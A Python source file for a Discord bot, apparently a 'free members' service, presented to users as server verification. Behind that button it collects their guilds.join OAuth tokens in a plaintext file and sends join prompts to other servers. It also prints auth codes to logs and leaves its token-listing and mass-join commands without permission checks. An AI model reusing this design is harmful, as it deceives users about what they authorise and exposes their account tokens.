import discord
import requests
import json
import os
import asyncio
from discord.ext import commands, tasks
from datetime import datetime, timedelta
import time
from urllib.parse import urlencode

print("🚀 STARTING BOT...")

# Load config
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
     
    BOT_TOKEN = config['token']
    CLIENT_ID = config['id']
    CLIENT_SECRET = config['secret']
    MAIN_SERVER = 1554792081149394974        # Main Server ID
    FARM_CHANNEL_ID = 1555148485865775115   # Farm Channel ID
    ADD_BOT_CHANNEL_ID = 1555148941178314752 # Add Bot Channel ID
    VERIFY_CHANNEL_ID = 1555224390189453362  # Verify Channel ID
    CONFIRM_CHANNEL_ID = 1555253011947851806 # Join Confirmations Channel ID
     
    print(f"✅ Config loaded")
    print(f"🔑 Token: {BOT_TOKEN[:20]}...")
    print(f"🆔 Client ID: {CLIENT_ID}")
    print(f"🔒 Secret: {CLIENT_SECRET[:8]}...")
    print(f"🏠 Main Server: {MAIN_SERVER}")
    print(f"🌾 Farm Channel: {FARM_CHANNEL_ID}")
    print(f"🤖 Add Bot Channel: {ADD_BOT_CHANNEL_ID}")
    print(f"🛡️ Verify Channel: {VERIFY_CHANNEL_ID}")
    print(f"📥 Confirm Channel: {CONFIRM_CHANNEL_ID}")
     
except Exception as e:
    print(f"❌ Config error: {e}")
    exit(1)

# Create bot
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='*', intents=intents)
bot.remove_command("help")

# Store server join times
server_join_times = {}

class VerificationView(discord.ui.View):
    """Persistent view with a button that triggers the authentication prompt/link"""
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify / Authenticate", style=discord.ButtonStyle.green, custom_id="persistent_verify_button:v1", emoji="✅")
    async def verify_button_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            redirect_url = "https://free-members.vercel.app/index.html"
            scopes = "identify guilds.join"
             
            auth_params = {
                'client_id': CLIENT_ID,
                'response_type': 'code',
                'redirect_uri': redirect_url,
                'scope': scopes,
                'prompt': 'consent'
            }
             
            oauth_url = f"https://discord.com/oauth2/authorize?{urlencode(auth_params)}"
             
            embed = discord.Embed(
                title="🔐 Authentication Required",
                description="**Click the link below to get your authentication code:**",
                color=0x5865F2
            )
            embed.add_field(
                name="🚨 IMPORTANT",
                value="**Codes expire in 10 minutes!** Complete authentication quickly.",
                inline=False
            )
            embed.add_field(
                name="🔗 Auth Link", 
                value=f"[**👉 CLICK HERE TO AUTHENTICATE 👈**]({oauth_url})",
                inline=False
            )
            embed.add_field(
                name="📝 Steps:",
                value="1. Click the link above\n2. Authorize the application\n3. Copy the `code` parameter from the redirected URL (`?code=...`)\n4. Use `*auth YOUR_CODE_HERE` (or the `/auth` slash command)",
                inline=False
            )
             
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            print(f"❌ Error in verification button callback: {e}")
            if not interaction.response.is_done():
                await interaction.response.send_message("❌ An error occurred. Please try again later.", ephemeral=True)

class JoinConfirmView(discord.ui.View):
    """Interactive view sent to users in DMs and confirmation channel to join a server"""
    def __init__(self, target_server_id, server_name, user_id, access_token, refresh_token):
        super().__init__(timeout=60)  # 60 second timeout for the prompt
        self.target_server_id = target_server_id
        self.server_name = server_name
        self.user_id = user_id
        self.access_token = access_token
        self.refresh_token = refresh_token
        self.value = None

    @discord.ui.button(label="Accept & Join", style=discord.ButtonStyle.green, emoji="✅")
    async def accept_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != str(self.user_id):
            await interaction.response.send_message("❌ This confirmation button is not for you.", ephemeral=True)
            return

        await interaction.response.defer()
        
        # Get valid token (refreshing if needed)
        valid_token = get_valid_token(self.user_id, self.access_token, self.refresh_token)
        if not valid_token:
            await interaction.followup.edit_message(message_id=interaction.message.id, content="❌ Your session token has expired. Please re-authenticate using `*get_token`.", view=None)
            self.value = False
            self.stop()
            return

        # Perform the join request
        api_url = f"https://discord.com/api/v10/guilds/{self.target_server_id}/members/{self.user_id}"
        join_data = {"access_token": valid_token}
        headers = {
            "Authorization": f"Bot {BOT_TOKEN}",
            "Content-Type": "application/json"
        }

        response = requests.put(api_url, headers=headers, json=join_data)

        if response.status_code in (201, 204):
            embed = discord.Embed(
                title="✅ Successfully Joined!",
                description=f"You have been successfully added to **{self.server_name}**.",
                color=0x57F287
            )
            await interaction.followup.edit_message(message_id=interaction.message.id, content="", embed=embed, view=None)
            self.value = True
        else:
            error_text = response.text
            embed = discord.Embed(
                title="❌ Join Failed",
                description=f"Could not add you to **{self.server_name}**. Response: `{error_text}`",
                color=0xED4245
            )
            await interaction.followup.edit_message(message_id=interaction.message.id, content="", embed=embed, view=None)
            self.value = False
        self.stop()

    @discord.ui.button(label="Decline", style=discord.ButtonStyle.red, emoji="✖️")
    async def decline_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != str(self.user_id):
            await interaction.response.send_message("❌ This confirmation button is not for you.", ephemeral=True)
            return

        await interaction.response.defer()
        embed = discord.Embed(
            title="🚫 Request Cancelled",
            description=f"You declined the invite to join **{self.server_name}**.",
            color=0xED4245
        )
        await interaction.followup.edit_message(message_id=interaction.message.id, content="", embed=embed, view=None)
        self.value = False
        self.stop()

@bot.event
async def on_ready():
    print(f'🎯 Bot is ready: {bot.user}')
     
    # Register the persistent view so buttons work across restarts
    bot.add_view(VerificationView())
     
    # Sync hybrid/slash commands
    try:
        synced = await bot.tree.sync()
        print(f"🌲 Synced {len(synced)} slash command(s)")
    except Exception as e:
        print(f"❌ Failed to sync slash commands: {e}")
     
    # Initialize server join times
    for guild in bot.guilds:
        if guild.id != MAIN_SERVER:
            server_join_times[guild.id] = datetime.now()
            print(f"📝 Tracking server: {guild.name} ({guild.id})")
     
    # Check and send auto messages
    await check_and_send_add_bot_message()
    await check_and_send_verify_message()

    # Start the cleanup task
    check_server_ages.start()

async def check_and_send_add_bot_message():
    """Automatically sends the add-bot message to ADD_BOT_CHANNEL_ID if it hasn't been sent yet"""
    try:
        main_guild = bot.get_guild(MAIN_SERVER)
        if not main_guild:
            print("⚠️ Main server not found for auto add-bot message.")
            return

        target_channel = main_guild.get_channel(ADD_BOT_CHANNEL_ID)
        if not target_channel:
            print(f"⚠️ Add bot channel ({ADD_BOT_CHANNEL_ID}) not found.")
            return

        async for message in target_channel.history(limit=20):
            if message.author == bot.user and message.embeds:
                for embed in message.embeds:
                    if embed.title and "ADD BOT" in embed.title.upper():
                        print("✅ Add bot message already exists in the channel.")
                        return

        invite_url = "https://discord.com/oauth2/authorize?client_id=1555146429868023872&permissions=8&integration_type=0&scope=applications.commands+bot"
         
        embed = discord.Embed(
            title="🤖 ADD BOT TO YOUR SERVER",
            description="**Click the button below to add this bot to your server:**",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(
            name="🔗 Invite Link", 
            value=f"[**👉 CLICK HERE TO ADD BOT 👈**]({invite_url})", 
            inline=False
        )
         
        await target_channel.send(embed=embed)
        print("🚀 Successfully sent auto add-bot message to channel.")

    except Exception as e:
        print(f"❌ Error sending auto add-bot message: {e}")

async def check_and_send_verify_message():
    """Automatically sends the verification message to VERIFY_CHANNEL_ID if it hasn't been sent yet"""
    try:
        main_guild = bot.get_guild(MAIN_SERVER)
        if not main_guild:
            print("⚠️ Main server not found for auto verification message.")
            return

        target_channel = main_guild.get_channel(VERIFY_CHANNEL_ID)
        if not target_channel:
            print(f"⚠️ Verify channel ({VERIFY_CHANNEL_ID}) not found.")
            return

        async for message in target_channel.history(limit=20):
            if message.author == bot.user and message.embeds:
                for embed in message.embeds:
                    if embed.title and ("VERIFY" in embed.title.upper() or "AUTHENTICATION" in embed.title.upper()):
                        print("✅ Verification message already exists in the channel.")
                        return

        embed = discord.Embed(
            title="🛡️ SERVER VERIFICATION",
            description="**Click the button below to start your verification and authentication process!**",
            color=0x57F287,
            timestamp=datetime.now()
        )
        embed.add_field(
            name="📌 Instructions",
            value="1. Click the **Verify / Authenticate** button below.\n2. Follow the private prompt to generate your secure link.\n3. Authorize the connection to complete verification.",
            inline=False
        )

        await target_channel.send(embed=embed, view=VerificationView())
        print("🚀 Successfully sent auto verification message to channel.")

    except Exception as e:
        print(f"❌ Error sending auto verification message: {e}")

@tasks.loop(hours=24)  # Run once per day
async def check_server_ages():
    """Check servers and leave if they're older than 14 days (except main server)"""
    print("🔍 Checking server ages...")
     
    for guild in bot.guilds:
        if guild.id == MAIN_SERVER:
            continue
         
        guild_id = guild.id
        guild_name = guild.name
        guild_age = None
         
        if guild_id in server_join_times:
            join_time = server_join_times[guild_id]
            guild_age = datetime.now() - join_time
        else:
            server_join_times[guild_id] = datetime.now()
            guild_age = timedelta(0)
         
        if guild_age >= timedelta(days=14):
            try:
                print(f"🚪 Leaving server {guild_name} ({guild_id}) - Age: {guild_age.days} days")
                await guild.leave()
                 
                main_guild = bot.get_guild(MAIN_SERVER)
                if main_guild:
                    target_channel = main_guild.get_channel(FARM_CHANNEL_ID)
                    if not target_channel:
                        for channel in main_guild.text_channels:
                            if channel.permissions_for(main_guild.me).send_messages:
                                target_channel = channel
                                break
                     
                    if target_channel and target_channel.permissions_for(main_guild.me).send_messages:
                        embed = discord.Embed(
                            title="🚪 Bot Left Server",
                            description=f"**Server:** {guild_name}\n**ID:** {guild_id}\n**Reason:** Server age ({guild_age.days} days) exceeded 14 days",
                            color=0xED4245,
                            timestamp=datetime.now()
                        )
                        await target_channel.send(embed=embed)
                 
                if guild_id in server_join_times:
                    del server_join_times[guild_id]
                 
            except Exception as e:
                print(f"❌ Error leaving server {guild_name}: {e}")
        else:
            print(f"✅ Server {guild_name} is {guild_age.days} days old - OK")

@bot.event
async def on_guild_join(guild):
    """Track when bot joins a new server"""
    if guild.id != MAIN_SERVER:
        server_join_times[guild.id] = datetime.now()
        print(f"📝 Bot joined new server: {guild.name} ({guild.id})")
         
        main_guild = bot.get_guild(MAIN_SERVER)
        if main_guild:
            target_channel = main_guild.get_channel(FARM_CHANNEL_ID)
            if not target_channel:
                for channel in main_guild.text_channels:
                    if channel.permissions_for(main_guild.me).send_messages:
                        target_channel = channel
                        break
             
            if target_channel and target_channel.permissions_for(main_guild.me).send_messages:
                embed = discord.Embed(
                    title="🏠 Bot Joined Server",
                    description=f"**Server:** {guild.name}\n**ID:** {guild.id}\n**Members:** {guild.member_count}\n**Will leave after:** 14 days",
                    color=0x57F287,
                    timestamp=datetime.now()
                )
                await target_channel.send(embed=embed)

@bot.event
async def on_guild_remove(guild):
    """Remove server from tracking when bot leaves"""
    if guild.id in server_join_times:
        del server_join_times[guild.id]
        print(f"🗑 Removed tracking for server: {guild.name} ({guild.id})")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Command not found. Use `*help` or `/help` to see available commands.")
    else:
        print(f"❌ Command error: {error}")

def refresh_access_token(refresh_token):
    """Refresh an expired access token"""
    try:
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token
        }
         
        response = requests.post('https://discord.com/api/v10/oauth2/token', data=data)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"❌ Token refresh failed: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"❌ Token refresh error: {e}")
        return None

def get_valid_token(user_id, access_token, refresh_token):
    """Get a valid access token, refreshing if needed"""
    headers = {'Authorization': f'Bearer {access_token}'}
    test_response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
     
    if test_response.status_code == 200:
        return access_token
     
    print(f"🔄 Token expired for user {user_id}, refreshing...")
    new_tokens = refresh_access_token(refresh_token)
     
    if new_tokens:
        update_token_in_file(user_id, new_tokens['access_token'], new_tokens['refresh_token'])
        return new_tokens['access_token']
    else:
        print(f"❌ Failed to refresh token for user {user_id}")
        return None

def update_token_in_file(user_id, new_access_token, new_refresh_token):
    """Update tokens in auths.txt file"""
    try:
        if not os.path.exists('auths.txt'):
            return False
         
        with open('auths.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
         
        updated = False
        new_lines = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
                 
            parts = line.split(',')
            if len(parts) >= 3 and parts[0] == user_id:
                new_line = f"{user_id},{new_access_token},{new_refresh_token}\n"
                new_lines.append(new_line)
                updated = True
                print(f"✅ Updated tokens for user {user_id}")
            else:
                new_lines.append(line + '\n')
         
        if updated:
            with open('auths.txt', 'w', encoding='utf-8') as f:
                f.writelines(new_lines)
            return True
         
        return False
    except Exception as e:
        print(f"❌ Error updating tokens in file: {e}")
        return False

@bot.hybrid_command(name='get_token')
async def get_auth_token(ctx):
    """Get authentication link"""
    try:
        redirect_url = "https://free-members.vercel.app/index.html"
        scopes = "identify guilds.join"
         
        auth_params = {
            'client_id': CLIENT_ID,
            'response_type': 'code',
            'redirect_uri': redirect_url,
            'scope': scopes,
            'prompt': 'consent'
        }
         
        oauth_url = f"https://discord.com/oauth2/authorize?{urlencode(auth_params)}"
         
        embed = discord.Embed(
            title="🔐 Authentication Required",
            description="**Click the link below to get your authentication code:**",
            color=0x5865F2
        )
        embed.add_field(
            name="🚨 IMPORTANT",
            value="**Codes expire in 10 minutes!** Complete authentication quickly.",
            inline=False
        )
        embed.add_field(
            name="🔗 Auth Link", 
            value=f"[**👉 CLICK HERE TO AUTHENTICATE 👈**]({oauth_url})",
            inline=False
        )
        embed.add_field(
            name="📝 Steps:",
            value="1. Click the link above\n2. Authorize the application\n3. Copy the `code` parameter from the redirected URL (`?code=...`)\n4. Use `*auth YOUR_CODE_HERE`",
            inline=False
        )
         
        await ctx.send(embed=embed)
        print(f"✅ Sent auth link to {ctx.author.name}")
         
    except Exception as e:
        await ctx.send(f"❌ Error generating auth link: {str(e)}")
        print(f"❌ Error in get_token: {e}")

@bot.hybrid_command(name='auth')
async def authenticate_user(ctx, authorization_code: str):
    """Authenticate user with code"""
    try:
        authorization_code = authorization_code.strip()
        current_user_id = str(ctx.author.id)
         
        print(f"🔐 PROCESSING CODE: {authorization_code} for user {current_user_id}")
         
        msg = await ctx.send("🔄 Starting authentication...")
         
        token_data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code', 
            'code': authorization_code,
            'redirect_uri': "https://free-members.vercel.app/index.html"
        }
         
        await msg.edit(content="🔄 Exchanging code for token...")
        token_response = requests.post('https://discord.com/api/v10/oauth2/token', data=token_data)
         
        if token_response.status_code != 200:
            error_info = token_response.json()
            await msg.edit(content=f"❌ Token exchange failed: {error_info.get('error_description', 'Unknown error')}")
            return
         
        token_info = token_response.json()
        access_token = token_info['access_token']
        refresh_token = token_info['refresh_token']
         
        username = ctx.author.name
        auth_entry = f"{current_user_id},{access_token},{refresh_token}\n"
         
        existing_entries = []
        if os.path.exists('auths.txt'):
            try:
                with open('auths.txt', 'r', encoding='utf-8') as auth_file:
                    existing_entries = auth_file.readlines()
            except Exception as e:
                existing_entries = []
         
        cleaned_entries = []
        for line in existing_entries:
            line = line.strip()
            if not line:
                continue
            parts = line.split(',')
            if len(parts) >= 1 and parts[0] == current_user_id:
                continue
            cleaned_entries.append(line + '\n')
         
        cleaned_entries.append(auth_entry)
         
        with open('auths.txt', 'w', encoding='utf-8') as auth_file:
            auth_file.writelines(cleaned_entries)
         
        success_embed = discord.Embed(
            title="✅ AUTHENTICATION SUCCESSFUL!",
            description=f"**{username}** is now authenticated!",
            color=0x57F287
        )
        success_embed.add_field(name="User ID", value=f"`{current_user_id}`", inline=True)
        success_embed.add_field(name="Next Step", value="You will be asked for confirmation when admin uses `*djoin SERVER_ID`", inline=False)
         
        await msg.edit(content="", embed=success_embed)
        print(f"✅ Authentication completed for user {current_user_id}")
         
    except Exception as error:
        await ctx.send(f"❌ Error: {str(error)}")
        print(f"❌ Exception: {error}")

@bot.hybrid_command(name='djoin')
async def join_server(ctx, target_server_id: str):
    """Ask authenticated users via DM and confirmation channel to join a server"""
    try:
        bot_in_server = False
        server_name = "Unknown Server"
         
        for guild in bot.guilds:
            if str(guild.id) == target_server_id:
                bot_in_server = True
                server_name = guild.name
                break
         
        if not bot_in_server:
            invite_url = "https://discord.com/oauth2/authorize?client_id=1555146429868023872&permissions=8&integration_type=0&scope=applications.commands+bot"
             
            embed = discord.Embed(
                title="❌ BOT NOT IN SERVER",
                description=f"Bot is not in server `{target_server_id}`",
                color=0xED4245
            )
            embed.add_field(
                name="🚨 Solution", 
                value=f"**[Add bot to server first]({invite_url})**\nThen use `*djoin {target_server_id}` again",
                inline=False
            )
            await ctx.send(embed=embed)
            return
         
        if not os.path.exists('auths.txt'):
            await ctx.send("❌ No users are authenticated yet. Use `*get_token` to share with users.")
            return
         
        authenticated_users = []
        with open('auths.txt', 'r') as auth_file:
            for line in auth_file:
                line = line.strip()
                if not line:
                    continue
                 
                parts = line.split(',')
                if len(parts) >= 3:
                    authenticated_users.append({
                        'user_id': parts[0],
                        'access_token': parts[1],
                        'refresh_token': parts[2] if len(parts) > 2 else ""
                    })
         
        if not authenticated_users:
            await ctx.send("❌ No valid authenticated users found in auths.txt")
            return
         
        total_users = len(authenticated_users)
        status_msg = await ctx.send(f"📥 **JOIN CONFIRMATION STARTED**\nSending join request DMs and channel prompts to **{total_users}** users for **{server_name}**...")
         
        confirm_channel = bot.get_channel(CONFIRM_CHANNEL_ID)
        asked_count = 0
        accepted_count = 0
        failed_count = 0

        for user_data in authenticated_users:
            user_id = user_data['user_id']
            access_token = user_data['access_token']
            refresh_token = user_data['refresh_token']
             
            try:
                user_obj = await bot.fetch_user(int(user_id))
                if not user_obj:
                    failed_count += 1
                    continue

                embed = discord.Embed(
                    title="📥 Server Join Request",
                    description=f"Hello <@{user_id}>! An admin wants to add you to **{server_name}** (`{target_server_id}`).\n\nDo you want to join this server?",
                    color=0x5865F2
                )
                embed.set_footer(text="This request will expire in 60 seconds.")

                # Send view to user's DM and the confirmation channel simultaneously
                view = JoinConfirmView(target_server_id, server_name, user_id, access_token, refresh_token)
                
                # Try sending DM
                try:
                    await user_obj.send(embed=embed, view=view)
                except Exception as dm_err:
                    print(f"⚠️ Could not DM user {user_id}: {dm_err}")

                # Send to confirm channel as well
                if confirm_channel:
                    await confirm_channel.send(content=f"<@{user_id}>", embed=embed, view=view)

                asked_count += 1

                # Wait for user click response
                await view.wait()
                if view.value is True:
                    accepted_count += 1

            except Exception as e:
                print(f"❌ Error processing user {user_id}: {e}")
                failed_count += 1

            await asyncio.sleep(1)

        final_embed = discord.Embed(
            title="🎯 JOIN REQUEST ROUND COMPLETED",
            description=f"**Server:** {server_name}\n**Total Users Contacted:** {asked_count}/{total_users}",
            color=0x57F287
        )
        final_embed.add_field(name="✅ Accepted & Joined", value=accepted_count, inline=True)
        final_embed.add_field(name="❌ Ignored / Failed", value=(total_users - accepted_count), inline=True)

        await status_msg.edit(content="", embed=final_embed)
         
    except Exception as error:
        await ctx.send(f"❌ Mass join error: {str(error)}")

@bot.hybrid_command(name='check_tokens')
async def check_token_validity(ctx):
    """Check which tokens are still valid"""
    try:
        if not os.path.exists('auths.txt'):
            await ctx.send("❌ No users are authenticated yet.")
            return
         
        users = []
        valid_count = 0
        expired_count = 0
         
        with open('auths.txt', 'r') as auth_file:
            for line in auth_file:
                line = line.strip()
                if not line:
                    continue
                 
                parts = line.split(',')
                if len(parts) >= 3:
                    user_id = parts[0]
                    access_token = parts[1]
                     
                    headers = {'Authorization': f'Bearer {access_token}'}
                    test_response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
                     
                    if test_response.status_code == 200:
                        status = "✅ VALID"
                        valid_count += 1
                    else:
                        status = "❌ EXPIRED"
                        expired_count += 1
                     
                    users.append(f"{status} <@{user_id}>")
         
        embed = discord.Embed(
            title="🔍 TOKEN VALIDITY CHECK",
            description=f"**Valid:** {valid_count} | **Expired:** {expired_count}",
            color=0x5865F2
        )
         
        if users:
            users_text = "\n".join(users[:15])
            if len(users) > 15:
                users_text += f"\n... and {len(users) - 15} more"
            embed.add_field(name="Token Status", value=users_text, inline=False)
         
        await ctx.send(embed=embed)
         
    except Exception as error:
        await ctx.send(f"❌ Error checking tokens: {str(error)}")

@bot.hybrid_command(name='list_users')
async def list_authenticated_users(ctx):
    """List all authenticated users"""
    try:
        if not os.path.exists('auths.txt'):
            await ctx.send("❌ No users are authenticated yet.")
            return
         
        users = []
        with open('auths.txt', 'r') as auth_file:
            for line_num, line in enumerate(auth_file, 1):
                line = line.strip()
                if not line:
                    continue
                 
                parts = line.split(',')
                if len(parts) >= 3:
                    user_id = parts[0]
                    token_preview = parts[1][:10] + "..." if len(parts[1]) > 10 else parts[1]
                    users.append(f"`{line_num}.` <@{user_id}> - `{token_preview}`")
         
        if not users:
            await ctx.send("❌ No valid authenticated users found.")
            return
         
        embed = discord.Embed(
            title="📋 AUTHENTICATED USERS",
            description=f"**Total: {len(users)} users**",
            color=0x5865F2
        )
         
        users_text = "\n".join(users[:20])
        if len(users) > 20:
            users_text += f"\n\n... and {len(users) - 20} more users"
         
        embed.add_field(name="Users", value=users_text, inline=False)
        await ctx.send(embed=embed)
         
    except Exception as error:
        await ctx.send(f"❌ Error listing users: {str(error)}")

@bot.hybrid_command(name='invite')
async def generate_invite(ctx):
    """Generate bot invite link for any server"""
    invite_url = "https://discord.com/oauth2/authorize?client_id=1555146429868023872&permissions=8&integration_type=0&scope=applications.commands+bot"
     
    embed = discord.Embed(
        title="🤖 BOT INVITE LINK",
        description="**Use this link to add the bot to any server:**",
        color=0x5865F2
    )
    embed.add_field(name="🔗 Invite Link", value=f"[**👉 CLICK HERE TO INVITE BOT 👈**]({invite_url})", inline=False)
     
    await ctx.send(embed=embed)

@bot.hybrid_command(name='servers')
async def list_servers(ctx):
    """List all servers the bot is in"""
    try:
        if not bot.guilds:
            await ctx.send("❌ Bot is not in any servers.")
            return
         
        server_list = []
        current_time = datetime.now()
         
        for guild in bot.guilds:
            age_days = "Permanent" if guild.id == MAIN_SERVER else "Unknown"
             
            if guild.id in server_join_times:
                join_time = server_join_times[guild.id]
                age = current_time - join_time
                age_days = f"{age.days} days"
             
            server_list.append(f"`{guild.id}` - **{guild.name}** (Members: {guild.member_count}) - Age: {age_days}")
         
        embed = discord.Embed(
            title="🏠 BOT SERVERS",
            description=f"**Total: {len(bot.guilds)} servers**\n⭐ = Main Server (Never leaves)",
            color=0x5865F2
        )
         
        servers_text = "\n".join(server_list[:15])
        if len(server_list) > 15:
            servers_text += f"\n... and {len(server_list) - 15} more servers"
         
        embed.add_field(name="Servers", value=servers_text, inline=False)
        await ctx.send(embed=embed)
         
    except Exception as error:
        await ctx.send(f"❌ Error listing servers: {str(error)}")

@bot.hybrid_command(name='server_age')
async def check_server_age(ctx, server_id: str = None):
    """Check how long the bot has been in a server"""
    try:
        if server_id:
            guild = bot.get_guild(int(server_id))
            if not guild:
                await ctx.send(f"❌ Bot is not in server with ID: {server_id}")
                return
        else:
            guild = ctx.guild
            if not guild:
                await ctx.send("❌ This command must be used in a server")
                return
         
        if guild.id == MAIN_SERVER:
            embed = discord.Embed(
                title="⭐ MAIN SERVER",
                description=f"**{guild.name}**\nID: `{guild.id}`",
                color=0xF1C40F
            )
            embed.add_field(name="Status", value="✅ **Permanent - Never leaves**", inline=False)
            embed.add_field(name="Members", value=guild.member_count, inline=True)
            await ctx.send(embed=embed)
            return
         
        if guild.id in server_join_times:
            join_time = server_join_times[guild.id]
            current_time = datetime.now()
            age = current_time - join_time
            days_left = max(0, 14 - age.days)
             
            embed = discord.Embed(
                title="📅 SERVER AGE",
                description=f"**{guild.name}**\nID: `{guild.id}`",
                color=0x3498DB
            )
            embed.add_field(name="Current Age", value=f"{age.days} days", inline=True)
            embed.add_field(name="Days Until Leave", value=f"{days_left} days", inline=True)
            await ctx.send(embed=embed)
        else:
            server_join_times[guild.id] = datetime.now()
            await ctx.send(f"✅ Started tracking server **{guild.name}**. Will leave after 14 days.")
             
    except Exception as error:
        await ctx.send(f"❌ Error checking server age: {str(error)}")

@bot.hybrid_command(name='help')
async def show_help(ctx):
    """Show all available commands"""
    embed = discord.Embed(
        title="🤖 BOT COMMANDS - COMPLETE LIST",
        color=0x5865F2
    )
     
    embed.add_field(
        name="🔐 AUTHENTICATION", 
        value="`*get_token` (or `/get_token`) - Get auth link\n`*auth CODE` (or `/auth`) - Authenticate with code\n`*check_tokens` (or `/check_tokens`) - Check tokens", 
        inline=False
    )
    embed.add_field(
        name="🚀 MASS JOINING & SERVERS", 
        value="`*djoin SERVER_ID` (or `/djoin`) - Ask users to join server via DM & Channel\n`*servers` (or `/servers`) - List bot servers\n`*server_age` (or `/server_age`) - Check server age\n`*list_users` (or `/list_users`) - List verified users\n`*invite` (or `/invite`) - Get bot invite link", 
        inline=False
    )
    
    await ctx.send(embed=embed)

# Run the bot
if __name__ == "__main__":
    bot.run(BOT_TOKEN)